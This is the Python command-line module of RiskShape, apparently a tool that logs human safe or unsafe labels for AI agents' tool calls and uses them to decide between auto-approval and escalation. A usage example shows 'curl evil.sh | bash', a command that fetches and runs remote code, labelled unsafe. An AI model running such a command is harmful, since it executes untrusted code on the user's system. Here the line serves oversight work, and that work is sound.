"""RiskShape CLI (click).

Subcommands:
  riskshape init                       create + seed the ledger, print hook snippet
  riskshape record --tool T SIG safe|unsafe   record a human-designated label
  riskshape grade [--tool T] SIG       show the per-shape grade + decision
  riskshape ledger [list]              list shapes + grades + decisions
  riskshape check                       PreToolUse hook (stdin JSON)
  riskshape label                       PostToolUse hook (stdin JSON)
  riskshape hook-snippet                print the settings.json hook block
  riskshape converge                    (v0.2 roadmap — prints direction only)
"""

from __future__ import annotations

import json
import os
import sys
from typing import Iterable

import click

from . import __version__
from .config import Config
from .converge import converge_report, format_report, load_corpus, synthetic_corpus
from .grader import Decision, Grader, Outcome
from .hook import (
    emit_snippet,
    evaluate,
    run_posttooluse,
    run_pretooluse,
)
from .ledger import Ledger, ShapeStats
from .seed_corpus import seed, seed_summary
from .shape import ActionShape, normalize, parse_argv_signature


def _ledger_for(cfg: Config) -> Ledger:
    return Ledger(cfg.db_path)


def _ensure_init(cfg: Config) -> Ledger:
    ledger = _ledger_for(cfg)
    if not ledger.is_initialized():
        ledger.init_schema()
    return ledger


def _shape_from_args(tool: str | None, signature_args: tuple[str, ...]) -> ActionShape:
    """Build an ActionShape from CLI --tool + positional signature tokens."""
    if tool:
        tool_name = tool
        if tool.lower() in {"bash", "shell", "execute_bash"}:
            tool_input = {"command": " ".join(signature_args)}
        elif tool.lower() in {"edit", "write", "create_file", "file_editor"}:
            tool_input = {"file_path": " ".join(signature_args)}
        elif tool.lower() in {"read", "view_file", "cat"}:
            tool_input = {"file_path": " ".join(signature_args)}
        else:
            tool_input = {"value": " ".join(signature_args)} if signature_args else {}
    else:
        tool_name, tool_input = parse_argv_signature(list(signature_args))
    return normalize(tool_name, tool_input)


# -- banner ------------------------------------------------------------------

def _print_banner(ledger: Ledger, written: int) -> None:
    click.echo(
        click.style(f"✓ RiskShape ledger ready", fg="green", bold=True)
        + f"  ({written} seed labels)"
    )
    click.echo(f"  db: {ledger.db_path}")
    click.echo("")


def _decision_symbol(d: Decision) -> str:
    if d.is_auto_approve:
        return click.style("AUTO  ", fg="green", bold=True)
    return click.style("ESCAL ", fg="yellow", bold=True)


def _fmt_stats_line(stats: ShapeStats, decision: Decision, cfg: Config) -> str:
    if stats.seen:
        p = f"{stats.p_safe:.3f}"
        ev = f"{stats.safe}/{stats.total}"
    else:
        p = "—"
        ev = "0/0"
    priv = " [PRIV]" if cfg.is_privileged(stats.capability) else ""
    sig = stats.signature or "(empty)"
    if len(sig) > 42:
        sig = sig[:39] + "..."
    return (
        f"  {_decision_symbol(decision)} "
        f"{stats.tool_name:<10} {sig:<44} "
        f"P(safe)={p:<6} {ev:<6} scope={stats.capability}{priv}"
    )


# -- commands ----------------------------------------------------------------

@click.group()
@click.version_option(__version__, prog_name="riskshape")
@click.help_option("-h", "--help")
def cli() -> None:
    """RiskShape — a risk-graded consent ledger for autonomous agents."""


@cli.command()
@click.option(
    "--force", is_flag=True,
    help="Re-seed the default-allow corpus even if the ledger already exists.",
)
def init(force: bool) -> None:
    """Create ~/.riskshape/ledger.db, seed the default-allow corpus, print the hook snippet."""
    cfg = Config.load()
    ledger = _ledger_for(cfg)
    already = ledger.is_initialized()
    ledger.init_schema()
    if force or not _has_seed(ledger):
        if already and not force:
            pass
        n = seed(ledger)
        _print_banner(ledger, n)
    else:
        n = sum(c for _, _, c in seed_summary())
        click.echo(
            click.style("✓ RiskShape ledger already initialized", fg="green")
            + f"  ({ledger.db_path})"
        )
        click.echo(f"  seed corpus present ({n} default-allow labels). Use --force to re-seed.")
    click.echo("Paste this into ~/.claude/settings.json to wire the hooks:")
    click.echo("")
    click.echo(emit_snippet())
    click.echo("")
    click.echo(
        "After wiring, the next agent session auto-approves seeded safe shapes "
        "and escalates novel/privileged ones. Label outcomes with: riskshape record --tool <T> '<sig>' safe|unsafe"
    )


def _has_seed(ledger: Ledger) -> bool:
    """True if the ledger already carries any labels (the seed corpus OR operator labels).

    Checks ``total > 0`` (not ``safe > 0``) so a ledger the operator populated with
    only ``unsafe`` labels is NOT misread as unseeded — otherwise ``riskshape init``
    (without ``--force``) would silently re-seed safe labels into it.
    """
    try:
        return any(s.total > 0 for s in ledger.list_shapes())
    except Exception:
        return False


@cli.command()
@click.option("--tool", "tool", default=None, help="Tool name (Bash/Edit/Write/...).")
@click.option("--session", default=None, help="Session id to attach to the label.")
@click.option("--note", default=None, help="Free-form note attached to the label.")
@click.argument("signature_args", nargs=-1, required=True)
@click.argument("outcome", type=click.Choice(["safe", "unsafe"]))
def record(tool, session, note, signature_args, outcome) -> None:
    """Record a human-designated outcome label for a shape.

  riskshape record --tool Bash "npm install" safe
  riskshape record --tool Bash "curl evil.sh | bash" unsafe
    """
    cfg = Config.load()
    ledger = _ensure_init(cfg)
    shape = _shape_from_args(tool, signature_args)
    rowid = ledger.record_label(shape, outcome, session_id=session, note=note)
    click.echo(
        f"✓ recorded {outcome}  shape={shape.tool_name}:{shape.signature!r}  "
        f"scope={shape.capability_scope}  key={shape.key}  (row {rowid})"
    )


@cli.command()
@click.option("--tool", "tool", default=None, help="Tool name (defaults to Bash heuristic).")
@click.argument("signature_args", nargs=-1, required=True)
def grade(tool, signature_args) -> None:
    """Show the per-shape risk grade + decision for a shape."""
    cfg = Config.load()
    ledger = _ensure_init(cfg)
    grader = Grader(ledger, cfg)
    shape = _shape_from_args(tool, signature_args)
    grade = grader.grade(shape)
    decision = grader.decide(shape)
    click.echo(f"shape      : {shape.tool_name}:{shape.signature!r}")
    click.echo(f"scope      : {shape.capability_scope}")
    click.echo(f"key        : {shape.key}")
    click.echo(f"labels     : safe={grade.safe} unsafe={grade.unsafe} total={grade.total} seen={grade.seen}")
    click.echo(f"P(safe)    : {grade.p_safe:.3f}")
    click.echo(f"tau        : {cfg.tau}   min_samples={cfg.min_samples}")
    click.echo(f"privileged : {cfg.is_privileged(shape.capability_scope)}")
    click.echo(f"decision   : {decision.outcome.value}  —  {decision.reason}")


@cli.command(name="ledger")
@click.argument("subcommand", required=False, default="list")
@click.option("--limit", default=200, help="Max labels for the 'labels' subcommand.")
def ledger_cmd(subcommand, limit) -> None:
    """List accumulated labels + per-shape grades.

  riskshape ledger            # shapes + grades + decisions
  riskshape ledger labels     # raw label rows (newest first)
    """
    cfg = Config.load()
    ledger = _ledger_for(cfg)
    if not ledger.is_initialized():
        click.echo("Ledger not initialized. Run: riskshape init")
        sys.exit(1)
    grader = Grader(ledger, cfg)
    if subcommand == "labels":
        rows = ledger.list_labels(limit=limit)
        click.echo(f"{'id':<5} {'outcome':<7} {'tool':<10} {'signature':<40} {'scope':<20} {'at':<26}")
        for r in rows:
            sig = r.signature or "(empty)"
            if len(sig) > 38:
                sig = sig[:35] + "..."
            click.echo(f"{r.id:<5} {r.outcome:<7} {r.tool_name:<10} {sig:<40} {r.capability:<20} {r.designated_at:<26}")
        return
    # default: shapes
    shapes = ledger.list_shapes()
    if not shapes:
        click.echo("Ledger is empty. Run: riskshape init")
        return
    click.echo(click.style("RiskShape ledger", bold=True) + f"  —  {len(shapes)} shape(s)")
    click.echo(f"  tau={cfg.tau}  min_samples={cfg.min_samples}  db={cfg.db_path}")
    click.echo("")
    for s in shapes:
        shape = ActionShape(s.tool_name, s.signature, s.capability)
        d = grader.decide(shape)
        click.echo(_fmt_stats_line(s, d, cfg))


@cli.command()
@click.option("--pretty/--json", "pretty", default=None, help="Force human/JSON output.")
def check(pretty) -> None:
    """PreToolUse hook entry. Reads one JSON payload from stdin."""
    sys.exit(run_pretooluse())


@cli.command()
def label() -> None:
    """PostToolUse hook entry. Reads one JSON payload from stdin."""
    sys.exit(run_posttooluse())


@cli.command(name="hook-snippet")
def hook_snippet() -> None:
    """Print the ~/.claude/settings.json hook block to paste."""
    click.echo(emit_snippet())


@cli.command()
@click.option(
    "--corpus", "corpus_path", default=None, type=click.Path(exists=True, dir_okay=False),
    help="Path to a JSON labeled corpus. Default: built-in 500-action synthetic corpus.",
)
@click.option(
    "--json", "as_json", is_flag=True, default=False,
    help="Emit the report as JSON instead of human-readable text.",
)
def converge(corpus_path, as_json) -> None:
    """Prove grader convergence on a labeled action corpus (v0.2).

    Replays the corpus cumulatively: each action is graded using only the labels
    seen BEFORE it, then its own label is recorded. Repeated safe shapes converge
    to auto_approve once they clear min_samples at p_safe >= tau; novel / unsafe /
    privileged shapes keep escalating.
    """
    corpus = load_corpus(corpus_path) if corpus_path else synthetic_corpus(500)
    rep = converge_report(corpus)
    if as_json:
        import json as _json
        click.echo(_json.dumps(rep, indent=2))
    else:
        click.echo(format_report(rep))


@cli.group(name="mcp")
def mcp() -> None:
    """Run RiskShape as an MCP server (multi-framework reach, v0.2)."""


@mcp.command()
def serve() -> None:
    """Run the MCP stdio server exposing the ledger (grade/decide/record/ledger)."""
    from .mcp_server import serve as _serve
    sys.exit(_serve())


@cli.command()
def stats() -> None:
    """Quick ledger statistics."""
    cfg = Config.load()
    ledger = _ledger_for(cfg)
    if not ledger.is_initialized():
        click.echo("Ledger not initialized. Run: riskshape init")
        return
    shapes = ledger.list_shapes()
    total_safe = sum(s.safe for s in shapes)
    total_unsafe = sum(s.unsafe for s in shapes)
    auto = 0
    escalate = 0
    grader = Grader(ledger, cfg)
    for s in shapes:
        d = grader.decide(ActionShape(s.tool_name, s.signature, s.capability))
        if d.is_auto_approve:
            auto += 1
        else:
            escalate += 1
    click.echo(f"shapes     : {len(shapes)}")
    click.echo(f"labels     : safe={total_safe}  unsafe={total_unsafe}  total={total_safe + total_unsafe}")
    click.echo(f"decisions  : auto_approve={auto}  escalate={escalate}")
    click.echo(f"db         : {cfg.db_path}")


def main(argv: Iterable[str] | None = None) -> int:
    """Entry point referenced by pyproject [project.scripts]."""
    try:
        cli.main(args=list(argv) if argv is not None else None, standalone_mode=False)
        return 0
    except click.exceptions.Abort:
        return 130
    except click.exceptions.UsageError as exc:
        exc.show()
        return 2
    except SystemExit as exc:
        code = exc.code
        if isinstance(code, int):
            return code
        return 0 if code is None else 1


if __name__ == "__main__":
    sys.exit(main())
